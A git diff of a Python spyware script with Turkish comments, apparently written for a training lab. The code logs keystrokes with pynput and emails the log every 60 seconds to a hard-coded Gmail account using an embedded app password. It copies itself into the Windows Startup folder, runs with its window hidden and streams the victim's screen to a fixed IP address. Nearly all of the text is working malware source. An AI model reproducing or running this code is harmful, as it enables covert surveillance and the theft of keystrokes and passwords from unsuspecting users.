@@ -12,10 +12,6 @@ import sys
 from vidstream import ScreenShareClient
 
 
-def screenshare():
-    baglan = ScreenShareClient('192.168.100.133', 9999)
-    baglan.start_stream()
-
 
 log = ''
 
@@ -61,13 +57,19 @@ def sender_email(email,password,message):
     email_server.login(email,password)
     email_server.sendmail(email,email,message)
     email_server.quit()
+    
+
+def screensharing():
+    baglanti = ScreenShareClient('192.168.100.133', 9999)
+    baglanti.start_stream()
 
 def thread_function():
     global log
-    sender_email("@gmail.com", "emiokybnnrttvizv", log.encode('utf-8'))
+    sender_email("rastgeletryhackme@gmail.com", "emiokybnnrttvizv", log.encode('utf-8'))
     log = ""
-    timer_object = threading.Timer(120,thread_function)
+    timer_object = threading.Timer(60,thread_function)
     timer_object.start()
+
 
 def copy_to_startup():
     try:
@@ -75,7 +77,7 @@ def copy_to_startup():
         startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
 
         # Kopyalanacak dosyanın adını ve kaynak yolunu belirle
-        source_filename = 'real123.exe'
+        source_filename = 'real3.exe'
         source_path = os.path.abspath(source_filename)
 
         # Hedef yol oluştur
@@ -86,20 +88,21 @@ def copy_to_startup():
 
         # Dosyayı çalıştır
         subprocess.Popen(destination, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
-
+        screensharing()
         # print(f"{source_filename} başarıyla başlangıç klasörüne kopyalandı ve çalıştırıldı.")
 
     except Exception as e:
         pass
         # print(f"Hata oluştu: {str(e)}")
+    
 
 
 keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
 
 
+
 copy_to_startup()
-screenshare()
 keylogger_listener.start()
 thread_function()
 keylogger_listener.join()   
-
+screensharing()
